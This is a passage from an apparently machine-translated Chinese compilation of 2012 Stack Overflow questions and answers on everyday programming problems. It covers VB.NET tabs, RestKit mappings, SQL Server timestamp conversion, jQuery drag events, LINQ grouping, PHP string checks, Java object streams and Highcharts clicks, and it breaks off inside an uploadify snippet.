    </asp:View>
</asp:MultiView> 
```

然后，您需要编写一个函数服务器端来处理选项卡点击：

```
Private Sub menu1_MenuItemClick(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.MenuEventArgs) Handles menu1.MenuItemClick
    Try
        If Multiview1.ActiveViewIndex <> Int32.Parse(e.Item.Value) Then
            Select Case Multiview1.ActiveViewIndex
                Case PageView.Tab1
                    Multiview1.ActiveViewIndex = Int32.Parse(e.Item.Value)
                Case PageView.Tab2
                    Multiview1.ActiveViewIndex = Int32.Parse(e.Item.Value)
            End Select
        End If
        ActiveView(e.Item.Value)
    Catch ex As Exception
        Throw ex
    End Try
End Sub 
```

还有一个处理 Active View 切换的函数：

```
Public Sub ActiveView(ByVal value As Integer)
    Try
         Multiview1.ActiveViewIndex = value
    Catch ex As Exception
        Throw ex
    End Try
End Sub 
```

这都是用VB编写的。所以如果你有任何问题，我很乐意回答。我希望这能让你走上正轨。为清楚起见，我没有添加任何与页面验证相关的内容。

# android - android：从arraylist中获取具有特定名称的对象

> ID：11583415
> 
> 赞同：1
> 
> 时间：2012-07-20T16:28:44.400
> 
> 标签：android, search, arraylist, filter

我有一个自定义对象的数组列表（ArrayList al1），它被加载到列表视图 lv1 中。还有另一个 listview lv2 填充了另一个具有相同对象的 arraylist (al2)。

现在，当用户单击 lv2 中的这些项目之一时，我需要从 al1 获取对象，并带有 lv2 中对象的名称（自定义对象中的字段）。

因此，我不想使用 getItem(int position) 访问该项目，而是想按名称查找该项目。

自定义对象如下所示：

```
public class Cover {

    private String path = null;
    private String name = null;
    private byte[] coverBytes = null;
    private ArrayList<Cover> subList = null;

    ... and getters/setters
} 
```

当用户单击 lv1 时，Cover 类中的 ArrayList 子列表用于填充第三个列表视图 lv3

谢谢你的任何想法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:33:44.560

尝试使用 a`SimpleAdapter`或`ArrayAdapter<Cover>`.

# ios - 你如何使用带有查询字符串的 RestKit 资源路径映射？

> ID：11583418
> 
> 赞同：3
> 
> 时间：2012-07-20T16:28:51.550
> 
> 标签：ios, restkit

我正在尝试使用对象加载器从需要传入类型作为查询参数的 API 获取对象（例如[http://example.com/api/households/:householdId/checklist_items?kind=todo](http://example.com/api/households/:householdId/checklist_items?kind=todo)）但无论我尝试以哪种方式注册资源路径，它似乎都不想找到我的映射。

我正在设置这样的映射：

```
RKObjectMapping* mapping = [RKObjectMapping mappingForClass:[RMChecklistItem class]];
[mapping mapKeyPath:@"id" toAttribute:@"checklistItemId"];
[mapping mapKeyPath:@"kind" toAttribute:@"kind"];
[mapping mapKeyPath:@"title" toAttribute:@"title"];
[mapping mapKeyPath:@"completed" toAttribute:@"completed"];
[mapping mapKeyPath:@"abilities" toAttribute:@"abilities"];
[mapping mapKeyPath:@"comments" toRelationship:@"comments" 
        withMapping:[provider objectMappingForClass:[RMComment class]]]; 
```

并使用基本路径和带有查询字符串的版本将其注册到对象映射提供程序：

```
[provider addObjectMapping:mapping];
[provider setObjectMapping:mapping forResourcePathPattern:@"/api/households/:householdId/checklist_items"];
[provider setObjectMapping:mapping forResourcePathPattern:@"/api/households/:householdId/checklist_items?kind=:kind"]; 
```

但是当我尝试使用它时：

```
NSDictionary *params [NSDictionary dictionaryWithObject:@"todo" forKey:@"kind"];
NSString *path = [NSString stringWithFormat:@"/api/households/%i/checklist_items", householdId.intValue];
[[RKObjectManager sharedManager] loadObjectsAtResourcePath:[path stringByAppendingQueryParameters:params] usingBlock:^(RKObjectLoader *loader) {
    loader.onDidLoadObjects = ^(NSArray *objects) {
        NSLog(@"%@", objects);
    };
    loader.onDidFailWithError = ^(NSError *error) {
        NSLog(@"%@", error);
    };
    loader.onDidFailLoadWithError = ^(NSError *error) {
        NSLog(@"%@", error);
    };
}]; 
```

情况很糟糕：

```
2012-07-20 12:13:18.533 roommates[22399:13d03] D restkit.object_mapping:RKObjectMapper.m:336 Performing object mapping sourceObject: (
        {
        abilities =         {
            destroy = 1;
        };
        comments =         (
        );
        completed = 0;
        id = 44;
        kind = todo;
        title = "and do the dishes";
    },
        {
        abilities =         {
            destroy = 1;
        };
        comments =         (
                        {
                body = "your!";
                "created_at" = "2012-07-18T22:20:08-05:00";
                "creator_id" = 16;
                id = 70;
            }
        );
        completed = 0;
        id = 43;
        kind = todo;
        title = "pick you shit up";
    },
        {
        abilities =         {
            destroy = 1;
        };
        comments =         (
                        {
                body = "did it";
                "created_at" = "2012-07-18T22:19:56-05:00";
                "creator_id" = 16;
                id = 69;
            }
        );
        completed = 0;
        id = 40;
        kind = todo;
        title = "Pay Rent";
    }
)
 and targetObject: (null)
2012-07-20 12:13:18.539 roommates[22399:13d03] T restkit.object_mapping:RKObjectMapper.m:293 Examining keyPath 'users' for mappable content...
2012-07-20 12:13:18.539 roommates[22399:13d03] D restkit.object_mapping:RKObjectMapper.m:120 Found a collection containing only NSNull values, considering the collection unmappable...
2012-07-20 12:27:47.702 roommates[22399:13d03] D restkit.object_mapping:RKObjectMapper.m:303 Found unmappable value at keyPath: users
2012-07-20 12:27:47.705 roommates[22399:13d03] D restkit.object_mapping:RKObjectMapper.m:367 The following operations are in the queue: (
)
2012-07-20 12:27:51.065 roommates[22399:13d03] W restkit.object_mapping:RKObjectMapper.m:87 Adding mapping error: Could not find an object mapping for keyPath: ''
2012-07-20 12:27:51.066 roommates[22399:13d03] E restkit.network:RKObjectLoader.m:234 Encountered errors during mapping: Could not find an object mapping for keyPath: '' 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:07:29.940

因此，在调试器中观察流程时，我遇到了`mappingForPatternMatchingString:context:`调用 RKPathMatcher 的 RKObjectMappingProvider，`matchesPath:string tokenizeQueryStrings:NO parsedArguments:nil`所以我猜这是设计使然。

对于查询参数“todo”和“shopping”，我真的只有两个可能的值，所以将两者都注册并不是不合理的。

**更新：**我提交了一个拉取请求，将其更改为解析查询字符串中的令牌：[https ://github.com/RestKit/RestKit/pull/871](https://github.com/RestKit/RestKit/pull/871)

# sql-server - 这是什么日期格式？(001281379300724)

> ID：11583422
> 
> 赞同：2
> 
> 时间：2012-07-20T16:28:59.143
> 
> 标签：sql-server, datetime

如果可能，需要在 SQL Server 中将此时间戳 (001281379300724) 转换为 YYYY-MM-DD hh:mm:ss 格式。有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:40:10.970

这假定时间戳是自 UNIX 纪元以来的 ms。它仅转换为最接近的秒数，但您可以向其添加 ms（见下文）。它必须使用两个步骤，因为 dateadd 需要一个 int。首先除以 60000 添加分钟，然后添加秒。

```
DECLARE @yournum bigint
SET @yournum = 1281379300724     
SELECT DATEADD(ss, (@yournum / 1000)%60 , (DATEADD(mi, @yournum/1000/60, '19700101'))) 
```

给

```
 2010-08-09 18:41:40.000 
```

要获得毫秒精度：（糟糕，可能是更好的方法）

```
DECLARE @yournum bigint
SET @yournum = 1281379300724     
SELECT DATEADD(ms, (@yournum%1000),DATEADD(ss, (@yournum / 1000)%60 , (DATEADD(mi, @yournum/1000/60, '19700101')))) 
```

给

```
2010-08-09 18:41:40.723 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:41:26.493

简单的答案是，如果这是一个 SQL 时间戳列（又名[rowversion](http://msdn.microsoft.com/en-us/library/ms182776%28v=sql.105%29.aspx)），则不能。根据该类型的文档：

> 每个数据库都有一个计数器，对于在数据库中包含 rowversion 列的表执行的每个插入或更新操作，该计数器都会递增。此计数器是数据库行版本。这跟踪数据库中的相对时间，而不是可以与时钟关联的实际时间。

...

> Transact-SQL 时间戳数据类型不同于 ISO 标准中定义的时间戳数据类型。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-20T16:45:34.780

您可以通过这种方式稍微靠近一点：

```
SELECT DATEADD(MINUTE, 1281379300724/1000/60, '19700101') 
```

结果：

```
2010-08-09 18:41:00.000 
```

# javascript - 如何在 jquery droppable 事件中做某事

> ID：11583432
> 
> 赞同：1
> 
> 时间：2012-07-20T16:29:37.883
> 
> 标签：javascript, jquery, jquery-ui-draggable

大家好，如果这是一个愚蠢的问题，我很抱歉。但我是 javascript 新手。

我有一个可拖动的 div。现在我想在该 div 被删除时做一些事情 到目前为止，我已经写了一个简单的警报，但它不起作用。谁能指导我如何在 drop 事件中编写一些代码。

这是我的代码

```
<div id = "par" class = "ui-draggable" style="position: relative; height: 200px; width: 200px;outline:2px solid green">
</div>

<script>
     $('#par').draggable();
     $('#par').droppable({
            drop: function( event, ui ) {
                  alert("blabla");                                       
            }
     });
</script> 
```

这是小提琴 [Draggable droppable的链接](http://jsfiddle.net/MddyD/1/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:35:57.440

就像 MrObrian 说的那样，你需要使用`draggable.stop`你想要实现的目标。

这个小提琴说明了差异。 [http://jsfiddle.net/MddyD/4/](http://jsfiddle.net/MddyD/4/)

```
$(function() {
 $('#par').draggable({
               stop: function() { 
                       alert("hi");
                     }
            });

 $("#dropIn").droppable({
               drop: function() { 
                       alert("drop");
                     }
               }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:37:19.910

使用 Droppable.drop 捕获 droppable 上的内容（您需要同时使用可拖动和可放置）

[http://docs.jquery.com/UI/Droppable#event-drop](http://docs.jquery.com/UI/Droppable#event-drop)

```
<script>
     $('#thingToDrag").draggable();
     $('#par').droppable({
            accept: "#thingToDrag",
            drop: function( event, ui ) {
                  alert("draggable dropped");                                       
            }
     });
</script> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:39:31.103

您需要使用`dragstop`将在可拖动元素停止拖动时启动的事件：

```
$('#par')
.draggable()
.on('dragstop', function(event, ui) {
    alert('ok')
}); 
```

[http://jsfiddle.net/MddyD/3/](http://jsfiddle.net/MddyD/3/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T16:41:16.680

在这里，您需要使用设置为可拖动的对象。您可以将函数绑定到停止事件。

```
<script>
    $(function() {
        $('#par').draggable({
            stop: function(event, ui) {
                alert("Dropped");
            }
        });
    });
</script> 
```

$(函数(){ }); 只是告诉脚本在文档加载完成后运行。您也可以将您创建的任何其他函数绑定到停止事件。

[http://jqueryui.com/demos/draggable/#event-stop](http://jqueryui.com/demos/draggable/#event-stop)

# jquery - 附加主 CSS 文件时，blueimp jQuery File Upload 插件不起作用？

> ID：11583436
> 
> 赞同：1
> 
> 时间：2012-07-20T16:30:07.040
> 
> 标签：jquery, file-upload, blueimp

我在我的 MVC 3 项目中包含了一个[https://github.com/blueimp/jQuery-File-Upload](https://github.com/blueimp/jQuery-File-Upload)插件。令人惊讶的是，当我的`Layout.cshtml`文件中有那一行时

```
<link href="@Url.Content("~/Content/Home.css")" rel="stylesheet" type="text/css" /> 
```

当`file dialog`我点击按钮时不显示`Browse for files`。**而且，即使该`Home.css`文件为空，也会发生相同的情况**

如果我只是删除`<link .... />`该插件工作正常的声明。谁能向我解释为什么会在这里发生这种魔法？

这是该插件所需的完整列表，也许会有所帮助

```
<link href="/Content/Site.css?cdv=1" type="text/css" rel="stylesheet"/>
<link href="/Content/Bootstrap/bootstrap.min.css?cdv=1" type="text/css" rel="stylesheet"/>
<link href="/Content/Bootstrap/bootstrap-responsive.min.css?cdv=1" type="text/css" rel="stylesheet"/>
<link href="/Content/Bootstrap/bootstrap-image-gallery.min.css?cdv=1" type="text/css" rel="stylesheet"/>
<link href="/Content/FileUpload/jquery.fileupload-ui.css?cdv=1" type="text/css" rel="stylesheet"/>   

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js?cdv=1" type="text/javascript"></script>
<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.18/jquery-ui.min.js?cdv=1" type="text/javascript"></script>

<script src="/Content/FileUpload/load-image.min.js?cdv=1" type="text/javascript"></script>
<script src="/Content/FileUpload/canvas-to-blob.min.js?cdv=1" type="text/javascript"></script>
<script src="/Content/FileUpload/tmpl.min.js?cdv=1" type="text/javascript"></script>
<script src="/Content/Bootstrap/bootstrap.min.js?cdv=1" type="text/javascript"></script>
<script src="/Content/Bootstrap/bootstrap-image-gallery.min.js?cdv=1" type="text/javascript"></script>
<script src="/Content/FileUpload/jquery.fileupload.js?cdv=1" type="text/javascript"></script>
<script src="/Content/FileUpload/jquery.iframe-transport.js?cdv=1" type="text/javascript"></script>
<script src="/Content/FileUpload/jquery.fileupload-ip.js?cdv=1" type="text/javascript"></script>
<script src="/Content/FileUpload/jquery.fileupload-ui.js?cdv=1" type="text/javascript"></script>
<script src="/Content/FileUpload/locale.js?cdv=1" type="text/javascript"></script>
<script src="/Content/FileUpload/main.js?cdv=1" type="text/javascript"></script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T18:13:06.157

## 解决了

目的是，在我的`Home.css`文件中是那一行：

```
input[type="file"] { width: 285px; background: white; } 
```

当我删除它时，插件开始正常工作。天哪...

# c# - linq-to-sql 分组匿名类型

> ID：11583439
> 
> 赞同：2
> 
> 时间：2012-07-20T16:30:36.210
> 
> 标签：c#, linq-to-sql

我有一张包含约会的桌子。这些约会有不同的状态（字节从 1 到 5）和日期；日期列被简单地称为`AppointDate`。我传入了一个 ID 列表，我想根据状态以及约会日期是否过去对结果进行分组。

`TheIDs`是作为参数传入的 long 列表。这是我到目前为止所拥有的：

```
var TheCounterInDB = (from a in MyDC.Appointments
                      where TheIDs.Contains(a.ID)
                      group a by a.AppointStatus into TheGroups
                      select new { 
                             TheStatus = TheGroups.Key,
                             TheTotalCount = TheGroups.Count(),
                             TheLateCount = ?,
                             ThePendingCount = ?
                      }).ToList(); 
```

基本上，我想`TheLateCount`成为状态为 1 且日期已过的所有约会的计数，以及`ThePendingCount`状态为 1 且日期未过的所有约会的计数。我的匿名类型很适合返回所有不同状态的计数（这就是状态`.Key`），但我想知道如何最好地将日期要求添加到分组中。

感谢您的建议。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T16:37:23.163

```
var TheCounterInDB = (from a in MyDC.Appointments
                      where TheIDs.Contains(a.ID)
                      group a by a.AppointStatus into TheGroups
                      select new { 
                             TheStatus = TheGroups.Key,
                             TheTotalCount = TheGroups.Count(),
                             TheLateCount = TheGroups.Count(x => x.AppointStatus == 1 && x.AppointDate < DateTime.Today),
                             ThePendingCount = TheGroups.Count(x => x.AppointStatus == 1 && x.AppointDate >= DateTime.Today)
                      }).ToList(); 
```

# php - 如果 $_POST 值包含单词 AND，则插入单词 ARE

> ID：11583444
> 
> 赞同：-3
> 
> 时间：2012-07-20T16:30:59.113
> 
> 标签：php, if-statement, insert, field

我有一个典型的问题，我不确定这是否可能。我有一个表单，其中有一个字段，即 Producer。我如何使它成为可能，如果用户使用单词**并且**在字段中然后插入单词**在**结果中，如果用户不使用单词**并且**在字段中然后插入单词**在**结果中。让我用一个例子来解释一下。

示例（字段中的单词**和**）然后生成以下结果：

ABC**和**DEF**是**这部电影的制片人。

示例（单词**and**不在字段中）然后生成以下结果：

XYZ**是**这部电影的制片人。

我有以下代码：

```
if(!empty($_POST['Producer'])) {
$description .= ' ' . $_POST["Producer"] . ' is/are the producer(s) of the movie';
} 
```

请告诉我是否有人有这个想法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T16:36:20.223

只需调用haystack 和`strpos`needle即可。如果返回值为 false，则字符串不包含.`$_POST['Producer']``and``and`

现在您可以根据返回值创建您的输出。

[http://php.net/manual/en/function.strpos.php](http://php.net/manual/en/function.strpos.php)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-20T16:38:48.263

```
if(!empty($_POST['Producer']))
{
    if(stripos($_POST['Producer'], ' and ') != false) // ' and ' is found
        $producers = $_POST['Producer'] .' are the producers ';
    else
        $producers = $_POST['Producer'] .' is the producer ';

    $description = $producers .'of the movie';
} 
```

我放了`' and '`而不是`'and'`（带空格），因为某些名称包含单词“are”，因此即使只有一个名称，它也会返回true。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-20T16:45:26.130

下面的代码应该可以工作（未经测试）。

```
if(!empty($_POST['Producer'])) {
    $producer = $_POST["Producer"]; // CONSIDER SANITIZING
    $pos = stripos($_POST['Producer'], ' and ');
    list($verb, $pl) = $pos ? array('are', 's') : array('is', '');
    $description .= " $producer $verb the producer$pl of the movie";
} 
```

如前所述，您还应该考虑清理 $_POST["Producer"] 的传入值，具体取决于您打算如何使用格式化字符串。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T16:42:48.293

我没有对此进行测试，但类似的东西应该可以工作。

```
$string = $_POST['Producer'];

//This is the case if the user used and.
$start = strstr($string, 'and');
if($start != null)
{
    $newString = substr($string, 0, $start) . "are" . substr($string, $start+3, strlen($string))
} 
```

# foursquare - 仅按名称搜索场地

> ID：11583447
> 
> 赞同：3
> 
> 时间：2012-07-20T16:31:08.070
> 
> 标签：foursquare

我正在构建一个小型应用程序，用于按名称搜索场地

我正在使用 Foursquare API v2。场地搜索界面 [https://developer.foursquare.com/docs/venues/search](https://developer.foursquare.com/docs/venues/search)

问题是您必须说明**LL** 财产或**附近**财产

所以现在的工作就是在奇加科附近寻找麦当劳

但是，如果我想使用该关键字搜索所有场所，而不满足附近的某个地方怎么办？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-23T22:27:44.880

您目前需要为场所/搜索传递一个位置（ll 或附近）——foursquare 不支持搜索没有地理范围的场所。

场地搜索有一个高度实验性的“全球”意图，但它不受任何支持。

# jquery - 在jQuery语句中插入变量

> ID：11583450
> 
> 赞同：0
> 
> 时间：2012-07-20T16:31:13.887
> 
> 标签：jquery, variables

这可能是一个简单的问题，但我在这里感到困惑。

```
var videoSrc = "video/sample.mp4";
$('.abc').append('<video width="650" height="300" controls="controls"> <source src= "' 
+ videoSrc 
+ 'type="video/mp4" id="myVideo"/>Your browser does not support the video tag.</video>'     
);
}); 
```

我试图在 src 属性中插入变量 videoSrc 的值。它不是这样工作的。

以下代码工作正常：

```
$('.abc').append('<video width="650" height="300" controls="controls"> <source src="videos/sample2.mp4" '
+'type="video/mp4" id="myVideo"/>Your browser does not support the video tag.</video>'      
); 
```

但我必须动态插入 src 属性的值。

帮我解决这个问题。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T16:33:06.057

您的属性没有结束引号`src`，正如@Luuk van Egeraat 指出的那样，您有一个多余的“});” 在末尾。

```
var videoSrc = "video/sample.mp4";
$('.abc').append('<video width="650" height="300" controls="controls"> <source src= "' 
+ videoSrc 
+ 'type="video/mp4" id="myVideo"/>Your browser does not support the video tag.</video>'     
); 
```

变成

```
var videoSrc = "video/sample.mp4";
$('.abc').append('<video width="650" height="300" controls="controls"> <source src= "' 
+ videoSrc 
+ '" type="video/mp4" id="myVideo"/>Your browser does not support the video tag.</video>'     
); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:35:52.830

只是一些语法错误，[这是一个工作版本](http://jsfiddle.net/Luuk/NeugE/)。

```
var videoSrc = "video/sample.mp4";

$('.abc').append('<video width="650" height="300" controls="controls"><source src= "' + videoSrc + '" type="video/mp4" id="myVideo"/>Your browser does not support the video tag.</video>');​ 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T17:00:28.993

这个有效：

```
var videoSrc = "video/sample.mp4";
$('.abc').append('<video width="650" height="300" controls="controls"> <source src= " ' 
+ vidSrc 
+ ' " type="video/mp4" id="myVideo"/>Your browser does not support the video tag.</video>'     
); 
```

谢谢大家。

# batch-file - 将参数回显到日志文件

> ID：11583451
> 
> 赞同：0
> 
> 时间：2012-07-20T16:31:23.933
> 
> 标签：batch-file

我需要将日志记录添加到批处理文件中以了解传递给它的参数。因此，如果批处理文件是 run.bat，我尝试添加该行

```
ECHO %1 %2 %3 %4 %5 %6 %7 %8 %9 >> run.log 
```

这只是回显参数和字符串`>> run.log`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:54:25.993

我怀疑您的参数列表中某处有一个未闭合的引号（例如`foo.cmd "bar`会导致该行为）。您可以通过将重定向放在前面来解决这个问题`echo`（是的，这有效）：

```
>> run.log echo %* 
```

# python - QPrinter 不会多次打印

> ID：11583458
> 
> 赞同：0
> 
> 时间：2012-07-20T16:32:04.117
> 
> 标签：python, pyqt, qtwebkit

在我的应用程序中，我有一种方法供用户将报告转换为 PDF 文档。这完美地工作 - 一次。如果用户再次单击该按钮，则转换挂起。

这是我的代码：

```
def print_report(self):
        web = QtWebKit.QWebView()
        filename = "reporttemplate.html"
        file = open(filename,'r')
        html = file.read()
        file.close()

        web.setHtml(html)
        #web.show()

        printer = QtGui.QPrinter()
        printer.setPageSize(QtGui.QPrinter.Letter)
        printer.setOutputFormat(QtGui.QPrinter.PdfFormat)

        # ---- BROKEN ----
        # This next line is where it hangs on the second call to this function.
        # The first time it works, and generates the PDF as expected.
        # ---- BROKEN ON THE NEXT LINE! ----
        printer.setOutputFileName(r'C:\path\to\report\directory\file.pdf')

        def convertIt():
            web.print_(printer)
            print "Pdf generated"
            web.close()

        QtCore.QObject.connect(web, QtCore.SIGNAL("loadFinished(bool)"), convertIt) 
```

我的想法是打印机仍然打开文件。如果是这种情况，我该如何关闭文件？

如果我重新启动应用程序并且文件已经存在，它就可以工作。出于这个原因，我不相信它会挂起，因为该文件已经存在。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-21T02:03:43.250

测试你的代码我注意到对我来说它只有在我把方法放在`web.setHtml(html)`最后（最后一个语句）时才有效`print_report`。这样做，我可以根据需要多次生成 file.pdf。

# java - 对象输入流类强制转换异常——即使它不应该发生

> ID：11583465
> 
> 赞同：0
> 
> 时间：2012-07-20T16:32:34.523
> 
> 标签：java, sockets, networking

我有一个奇怪的问题。我正在尝试编写带有聊天选项的简单客户端 - 服务器应用程序，但我遇到了一个问题 - 对象输入流读取错误的类。错误是：

```
Exception in thread "Thread-4" java.lang.ClassCastException: org.oxomoco.packets.PacketAlive cannot be cast to org.oxomoco.packets.PacketMessage
at org.oxomoco.server.SocketConnectionServer.run(SocketConnectionServer.java:52)
at java.lang.Thread.run(Unknown Source) 
```

它发生在这里：

```
 PacketMessage pm = (PacketMessage)ois.readObject(); 
```

在循环中看起来像这样：

```
 while(true){

            //if(ois.readObject() instanceof PacketMessage){

            //  pm = (PacketMessage)ois.readObject();
            //  se.println(ois.readObject().toString());
            //}

            if((ois.readObject() instanceof PacketMessage)==true){
                System.out.println("It is: " + (ois.readObject() instanceof PacketMessage));

                PacketMessage pm = (PacketMessage)ois.readObject();

                se.acprintln(">>",uname + ": " +pm.getMsg());

            }
            if((ois.readObject() instanceof PacketAlive)==true){
                System.out.println("-it is: " + (ois.readObject() instanceof PacketAlive));
                PacketAlive pa = (PacketAlive)ois.readObject();
            }

    } 
```

不知何故 - 即使我检查实例 - 对象输入流是 PacketMessage 的实例，而它应该是 PacketAlive 的实例。有谁知道为什么，当然 - 如何解决它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-20T16:35:42.340

你在执行

```
ois.readObject() 
```

几次，*每次都*得到一个不同的对象（不同的类？） 。`readObject()` *从流中拉出*每个对象，而不是将其留在那里。

相反，阅读它，分配给一个变量，然后执行你的测试等。例如

```
while (true) {
   Object obj = ois.readObject();
   // do something with obj... 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-20T16:35:04.027

尝试将 ois.readObject() 的返回值分配给一个变量，而不是调用它两次。

每次调用 readObject 时，都会从流中消耗更多字节，它不会每次都返回相同的对象。

# javascript - 多个 Onclick 图像

> ID：11583482
> 
> 赞同：2
> 
> 时间：2012-07-20T16:33:57.317
> 
> 标签：javascript, html

所以我正在尝试创建一个屏幕，该屏幕将显示大约 50 个切换按钮以显示在监视器上的建筑物中。

我想创建一堆图像用作切换开关，这样它们就很容易看到。这就是我想要的效果。 [http://www.w3schools.com/dhtml/tryit.asp?filename=trydhtml_intro](http://www.w3schools.com/dhtml/tryit.asp?filename=trydhtml_intro) 除了图片我想要几个灯泡按我的意愿打开和关闭。

现在这是我的代码。我可以根据需要单击图像进行更改，它们只是不会返回，有什么想法吗？

```
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01    
    Transitional//EN"  "http://www.w3.org/TR/html4/loose.dtd"> 
    <html> 
    <head> 
    <title>Untitled Document</title> 
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> 
    <meta http-equiv="Content-Style-Type" content="text/css"> 
    <meta http-equiv="Content-Script-Type" content="text/javascript"> 
    <script type="text/javascript">
    function changeImg(img, newimg) {
    img.src = newimg;
    }

    </script>
    <body>
    <img onclick="changeImg(this, 'staten_uw.jpg')" src="staten_moored.jpg">
    <img onclick="changeImg(this, 'block_uw.jpg')" src="block_moored.jpg">
    </body>
    </html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:42:24.020

他们不会返回，因为代码总是将其更改为 _uw 图像。如果您希望它们切换，该功能需要检查当前显示的图像。像这样的东西：

```
function changeImg(img) {
    if ( img.src.indexOf("_uw") > 0 ) {
        img.src = img.src.replace("_uw","_moored");
    }
    else {
        img.src = img.src.replace("_moored","_uw");
    }
} 
```

如果您有 50x2 个不同的图像，命名为“img1_uw.jpg”、“img1_moored.jpg”、“img2_uw.jpg”、“img2_moored.jpg”等，则可以使用。

如果您只有 2 张图片，但想要 50 个按钮在它们之间切换，那就更容易了：

```
function changeImg(img) {
    if ( img.src == "staten_uw.jpg" ) {
        img.src = "staten_moored.jpg";
    }
    else {
        img.src = "staten_uw.jpg";
    }
} 
```

其他答案也很简单地表明了这一点。

无论哪种方式，HTML 都应该变成这样：

```
<img onclick="changeImg(this)" src="block_moored.jpg"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:44:52.267

你可以这样做：

```
window.onload = function() {
    images = document.getElementsByTagName("img");
    for (i in images) {
        images[i].addEventListener("click", function(e) {
            var newsrc = this.togglesrc;
            this.togglesrc = this.src;
            this.src = newsrc;
        });
    }
}; 
```

然后使用

```
<img togglesrc="staten_uw.jpg" src="staten_moored.jpg" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:48:07.553

在您的情况下，您应该只使用一个 img 标签：

```
<img onclick="changeImg(this)" src="staten_moored.jpg"> 
```

并检查你的 js 中的逻辑：

```
function changeImg(img) {
  img.src = (img.src == 'staten_moored.jpg') ? 'block_moored.jpg' : 'staten_moored.jpg';
} 
```

# javascript - Highcharts 列系列点对象点击功能

> ID：11583486
> 
> 赞同：1
> 
> 时间：2012-07-20T16:34:14.623
> 
> 标签：javascript, charts, highcharts

最近我发布了一个关于 Highcharts 柱形图钻取的问题。我发现在点对象的单击事件中，您可以找出单击了哪一列。我在我的代码中实现了相同的功能，但我的代码中没有收到警报。请在下面找到我的代码。首先是我的图表选项变量 -

```
var columnoptions = {
                chart: {
                    renderTo: 'container',
                    type: 'column'
                },
                title: {
                    text: 'Column Chart'
                },
                xAxis: {
                    categories: []
                },
                yAxis: {
                    title: {
                        text: 'Exposure'
                    }
                },              
                plotOptions: {
            series: {
                cursor: 'pointer',
                point: {
                    events: {
                        click: function() {
                            alert ('here');
                        }
                    }
                }
            }
        },
                series: []
            }; 
```

我在循环中使用以下语句动态填充系列 -

```
columnoptions.xAxis.categories.push(categoryArray[index]);

             seriesOptions.data.push(valueArray[index]); 
```

最后我像这样显示我的图表 -

```
 chart = new Highcharts.Chart(columnoptions); 
```

但我没有收到任何关于列点击的警报。我在 IE 中收到错误 javascript 错误消息。我正在使用 IE8。请帮我解决这个问题。静态数据的 Highcharts 官方示例工作正常，我已经看到了。我的图表显示正确，没有任何问题。但我需要知道点击了哪一列来实现向下钻取功能。请帮忙。

---编辑这是我用来绘制图表的完整功能-

```
function displayColumnChart(){

         columnoptions.series = [];
         columnoptions.xAxis.categories = [];          

         var seriesOptions = {
                        name: 'Column Chart',
                        data: [],                       

                    };  

         /* category array contains x axis category values
            value array contains y axis numeric values */

         for(index = 0; index < categoryArray.length; index++){

             columnoptions.xAxis.categories.push(categoryArray[index]);

             seriesOptions.data.push(valueArray[index]);        

         }      

         columnoptions.series.push(seriesOptions);     

         chart = new Highcharts.Chart(columnoptions);
       } 
```

我正在从 XML 文档中读取数据，然后创建值和类别数组。图表很好，但在点击时没有得到警报。请帮忙。谢谢。:) 抱歉延迟发布代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T11:06:36.587

我只添加了最新版本的 highcharts 并且点击对我有用。谢谢。

# amazon-ec2 - 上传什么端口？关于亚马逊 ec2 问题

> ID：11583488
> 
> 赞同：0
> 
> 时间：2012-07-20T16:34:27.633
> 
> 标签：amazon-ec2, uploadify

我在托管在亚马逊 ec2 上的服务器上使用 uploadify，我打开了端口 80 和 22，Uploadify 使用哪个端口以便我可以修复它？

问题是uploadify让客户相信图像已上传但我没有到达我的服务器，我认为这是端口，因为它在我的旧服务器上使用hostgator

我在表格上的代码是：

```
// <![CDATA[

$(document).ready(function() {

$("#dialog").dialog({

        bgiframe: true,

        height: 250,

        width:400,

        autoOpen: false,

        modal: false,

        buttons: {

            'cancel order': function() {

                $(this).dialog('close');

                $('#file_upload').uploadifyClearQueue();

                $('#file_upload').uploadifyCancel(($('.uploadifyQueueItem').first().attr('id').replace('file_upload','')));

            },

            'confirm order': function() {

                 $('#file_upload').uploadifyUpload();

                 $(this).dialog('close');

            }

        }

});

$('#file_upload').uploadify({

'uploader'  : 'swf/uploadify.swf',

'script'    : 'swf/uploadify.php?userid=<?php echo $_SESSION['userid']; ?>',

